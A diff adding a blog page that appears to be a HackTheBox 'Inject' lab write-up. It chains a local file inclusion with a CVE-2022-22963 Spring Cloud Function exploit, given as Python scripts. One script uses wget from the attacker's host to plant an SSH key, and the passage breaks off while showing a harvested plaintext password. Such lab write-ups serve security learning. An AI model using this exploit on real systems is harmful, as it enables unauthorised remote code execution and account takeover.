@@ -1,0 +1,806 @@
+
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="light"
+  data-auto-appearance="true"
+><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#FFFFFF" />
+  
+  <title>HackTheBox - Inject &middot; Congo</title>
+    <meta name="title" content="HackTheBox - Inject &middot; Congo" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.74ad8406faea02f3e186ba5126249aaeed9073629e04b05037b903396b188724.js"
+    integrity="sha256-dK2EBvrqAvPhhrpRJiSaru2Qc2KeBLBQN7kDOWsYhyQ="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.8d03f49bff76158e114fdf6d18be3ad4d3b70309a01aebb97468ef8fd8d3b50a.css"
+    integrity="sha256-jQP0m/92FY4RT99tGL461NO3AwmgGuu5dGjvj9jTtQo="
+  />
+  
+  
+  
+  
+  
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        {% img /img/htb.
+      
+    "
+  />
+  
+  
+  
+  <link rel="canonical" href="//localhost:1313/blog/inject-htb/" />
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="//localhost:1313/blog/inject-htb/">
+  <meta property="og:site_name" content="Congo">
+  <meta property="og:title" content="HackTheBox - Inject">
+  <meta property="og:description" content="{% img /img/htb.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2023-07-08T00:00:00+00:00">
+    <meta property="article:modified_time" content="2023-07-08T00:00:00+00:00">
+
+  <meta name="twitter:card" content="summary"><meta name="twitter:title" content="HackTheBox - Inject">
+<meta name="twitter:description" content="{% img /img/htb.">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blogs",
+    "name": "HackTheBox - Inject",
+    "headline": "HackTheBox - Inject",
+    
+    "abstract": "{% img \/img\/htb.",
+    "inLanguage": "en",
+    "url" : "\/\/localhost:1313\/blog\/inject-htb\/",
+    "author" : {
+      "@type": "Person",
+      "name": ""
+    },
+    "copyrightYear": "2023",
+    "dateCreated": "2023-07-08T00:00:00\u002b00:00",
+    "datePublished": "2023-07-08T00:00:00\u002b00:00",
+    
+    "dateModified": "2023-07-08T00:00:00\u002b00:00",
+    
+    
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "843"
+  }
+  </script>
+
+
+  
+  
+  
+  
+  
+
+
+
+
+
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >Congo</a
+  >
+
+    </div>
+    
+    
+      <ul class="flex list-none flex-col text-end sm:flex-row">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href=""
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Blog</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/categories/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Categories</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/tags/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Tags</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                
+                
+              
+            </li>
+          
+            
+              
+          
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        HackTheBox - Inject
+      </h1>
+      
+        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2023-07-08 00:00:00 &#43;0000 UTC">8 July 2023</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+
+
+        </div>
+      
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <p>{% img /img/htb.png %}</p>
+<p>Writeup for HackTheBox&rsquo;s Inject machine.</p>
+<!-- more -->
+<p>We have an upload functionality in the web app and it accepts PNG files, although there are some bypasses but they didn’t lead anywhere.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Inject_-_Seasonal_9e3607466f6a4ad49fada783b796669f/Untitled_1.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Once you upload a valid PNG/Image file, you can view it by going to <code>show_image</code> and the filename is specified by the <code>img</code> parameter</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Inject_-_Seasonal_9e3607466f6a4ad49fada783b796669f/Untitled_2.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>It is vulnerable to LFI vulnerability, we can access any arbitrary file with the known location.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Inject_-_Seasonal_9e3607466f6a4ad49fada783b796669f/Untitled_3.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>After some hefty enumeration, we can see the absolute path for the webapp by checking the <code>webapp.service</code> this filename was retrieved from the <code>/opt/automation/tasks/playbook_1.yml</code> during initial enumeration, as giving the a directory location will list out the sub-directories and it’s associated files:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Inject_-_Seasonal_9e3607466f6a4ad49fada783b796669f/Untitled_4.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Checking the service files, we can get the location of the jar file of the webserver.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">[</span><span class="nf">Unit</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Description</span><span class="err">=</span><span class="no">Spring</span> <span class="no">WEb</span> <span class="no">APP</span>
+</span></span><span class="line"><span class="cl"><span class="nf">After</span><span class="err">=</span><span class="no">syslog.target</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nf">Service</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">User</span><span class="err">=</span><span class="no">frank</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Group</span><span class="err">=</span><span class="no">frank</span>
+</span></span><span class="line"><span class="cl"><span class="nf">ExecStart</span><span class="err">=/</span><span class="no">usr</span><span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">java</span> <span class="p">-</span><span class="no">Ddebug</span> <span class="p">-</span><span class="no">jar</span> <span class="err">/</span><span class="no">var</span><span class="err">/</span><span class="no">www</span><span class="err">/</span><span class="no">WebApp</span><span class="err">/</span><span class="no">target</span><span class="err">/</span><span class="no">spring-webapp.jar</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Restart</span><span class="err">=</span><span class="no">always</span>
+</span></span><span class="line"><span class="cl"><span class="nf">StandardOutput</span><span class="err">=</span><span class="no">syslog</span>
+</span></span><span class="line"><span class="cl"><span class="nf">StandardError</span><span class="err">=</span><span class="no">syslog</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nf">Install</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">WantedBy</span><span class="err">=</span><span class="no">multi-user.target</span>
+</span></span></code></pre></div><p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Inject_-_Seasonal_9e3607466f6a4ad49fada783b796669f/Untitled_5.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>With the retrieved information, we can get the Spring version by checking <code>pom.xml</code> and it is vulnerable with <a href="https://github.com/me2nuk/CVE-2022-22963" target="_blank" rel="noreferrer">https://github.com/me2nuk/CVE-2022-22963</a></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Inject_-_Seasonal_9e3607466f6a4ad49fada783b796669f/Untitled_6.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>I modified the original script to pass the arguments for better work:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib3</span>
+</span></span><span class="line"><span class="cl"><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">scan</span><span class="p">(</span><span class="n">txt</span><span class="p">,</span><span class="n">cmd</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="o">=</span><span class="sa">f</span><span class="s1">&#39;T(java.lang.Runtime).getRuntime().exec(&#34;</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s1">&#34;)&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span><span class="s1">&#39;test&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;spring.cloud.function.routing-expression&#39;</span><span class="p">:</span><span class="n">payload</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Accept-Encoding&#39;</span><span class="p">:</span> <span class="s1">&#39;gzip, deflate&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Accept&#39;</span><span class="p">:</span> <span class="s1">&#39;*/*&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Accept-Language&#39;</span><span class="p">:</span> <span class="s1">&#39;en&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">path</span> <span class="o">=</span> <span class="s1">&#39;/functionRouter&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">txt</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">urllist</span><span class="o">=</span><span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span>  <span class="n">url</span>  <span class="ow">in</span>  <span class="n">urllist</span> <span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="n">url</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">all</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="n">path</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">req</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="nb">all</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">code</span> <span class="o">=</span><span class="n">req</span><span class="o">.</span><span class="n">status_code</span>
+</span></span><span class="line"><span class="cl">            <span class="n">text</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span>
+</span></span><span class="line"><span class="cl">            <span class="n">rsp</span> <span class="o">=</span> <span class="s1">&#39;&#34;error&#34;:&#34;Internal Server Error&#34;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">code</span> <span class="o">==</span> <span class="mi">500</span> <span class="ow">and</span> <span class="n">rsp</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span> <span class="p">(</span> <span class="sa">f</span><span class="s1">&#39;[+] </span><span class="si">{</span> <span class="n">url</span> <span class="si">}</span><span class="s1"> is vulnerable&#39;</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">poc_file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;vulnerable.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;a+&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">poc_file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">poc_file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span> <span class="p">(</span> <span class="sa">f</span><span class="s1">&#39;[-] </span><span class="si">{</span> <span class="n">url</span> <span class="si">}</span><span class="s1"> not vulnerable&#39;</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">RequestException</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span> <span class="p">(</span> <span class="sa">f</span><span class="s1">&#39;[-] </span><span class="si">{</span> <span class="n">url</span> <span class="si">}</span><span class="s1"> detection timed out&#39;</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span> <span class="p">(</span> <span class="sa">f</span><span class="s1">&#39;[-] </span><span class="si">{</span> <span class="n">url</span> <span class="si">}</span><span class="s1"> error&#39;</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span> <span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cmd1</span> <span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cmd2</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span> <span class="o">.</span> <span class="n">Thread</span> <span class="p">(</span> <span class="n">target</span> <span class="o">=</span> <span class="n">scan</span> <span class="p">(</span> <span class="n">cmd1</span> <span class="p">,</span> <span class="n">cmd2</span> <span class="p">)</span> <span class="p">)</span> 
+</span></span><span class="line"><span class="cl">        <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="p">(</span> <span class="s1">&#39;Usage:&#39;</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;python poc.py url.txt&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
+</span></span></code></pre></div><p>For confirmation, doing a ping on my host from the Inject machine, using <code>tcpdump</code> we received ICMP requests.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Inject_-_Seasonal_9e3607466f6a4ad49fada783b796669f/Untitled_7.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Again, modifying the script to add the public key to the <code>frank</code> user so we can SSH into the machine.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib3</span>
+</span></span><span class="line"><span class="cl"><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">scan</span><span class="p">(</span><span class="n">txt</span><span class="p">,</span><span class="n">cmd</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="o">=</span><span class="sa">f</span><span class="s1">&#39;T(java.lang.Runtime).getRuntime().exec(&#34;wget http://10.10.14.19/authorized_keys -O /home/frank/.ssh/authorized_keys&#34;)&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span><span class="s1">&#39;test&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;spring.cloud.function.routing-expression&#39;</span><span class="p">:</span><span class="n">payload</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Accept-Encoding&#39;</span><span class="p">:</span> <span class="s1">&#39;gzip, deflate&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Accept&#39;</span><span class="p">:</span> <span class="s1">&#39;*/*&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Accept-Language&#39;</span><span class="p">:</span> <span class="s1">&#39;en&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">path</span> <span class="o">=</span> <span class="s1">&#39;/functionRouter&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">txt</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">urllist</span><span class="o">=</span><span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span>  <span class="n">url</span>  <span class="ow">in</span>  <span class="n">urllist</span> <span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="n">url</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">all</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="n">path</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">req</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="nb">all</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">code</span> <span class="o">=</span><span class="n">req</span><span class="o">.</span><span class="n">status_code</span>
+</span></span><span class="line"><span class="cl">            <span class="n">text</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span>
+</span></span><span class="line"><span class="cl">            <span class="n">rsp</span> <span class="o">=</span> <span class="s1">&#39;&#34;error&#34;:&#34;Internal Server Error&#34;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">code</span> <span class="o">==</span> <span class="mi">500</span> <span class="ow">and</span> <span class="n">rsp</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span> <span class="p">(</span> <span class="sa">f</span><span class="s1">&#39;[+] </span><span class="si">{</span> <span class="n">url</span> <span class="si">}</span><span class="s1"> is vulnerable&#39;</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">poc_file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;vulnerable.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;a+&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">poc_file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">poc_file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span> <span class="p">(</span> <span class="sa">f</span><span class="s1">&#39;[-] </span><span class="si">{</span> <span class="n">url</span> <span class="si">}</span><span class="s1"> not vulnerable&#39;</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">RequestException</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span> <span class="p">(</span> <span class="sa">f</span><span class="s1">&#39;[-] </span><span class="si">{</span> <span class="n">url</span> <span class="si">}</span><span class="s1"> detection timed out&#39;</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span> <span class="p">(</span> <span class="sa">f</span><span class="s1">&#39;[-] </span><span class="si">{</span> <span class="n">url</span> <span class="si">}</span><span class="s1"> error&#39;</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span> <span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cmd1</span> <span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cmd2</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span> <span class="o">.</span> <span class="n">Thread</span> <span class="p">(</span> <span class="n">target</span> <span class="o">=</span> <span class="n">scan</span> <span class="p">(</span> <span class="n">cmd1</span> <span class="p">,</span> <span class="n">cmd2</span> <span class="p">)</span> <span class="p">)</span> 
+</span></span><span class="line"><span class="cl">        <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="p">(</span> <span class="s1">&#39;Usage:&#39;</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;python poc.py url.txt&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
+</span></span></code></pre></div><p>Confirming the key has been added to the <code>authorized_keys</code> file for the <code>frank</code> user via LFI:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Inject_-_Seasonal_9e3607466f6a4ad49fada783b796669f/Untitled_8.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Successfully doing SSH into the machine as <code>frank</code> user:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Inject_-_Seasonal_9e3607466f6a4ad49fada783b796669f/Untitled_9.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>From the LFI itself, we were able to retrieve the file <code>/home/frank/.m2/settings.xml</code> and <code>paul</code> user password,</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">-bash-5.0$ cat .m2/settings.xml
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;settings</span> <span class="na">xmlns=</span><span class="s">&#34;http://maven.apache.org/POM/4.0.0&#34;</span> <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="na">xsi:schemaLocation=</span><span class="s">&#34;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;servers&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;server&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;id&gt;</span>Inject<span class="nt">&lt;/id&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;username&gt;</span>phil<span class="nt">&lt;/username&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;password&gt;</span>DocPhillovestoInject123<span class="nt">&lt;/password&gt;</span>
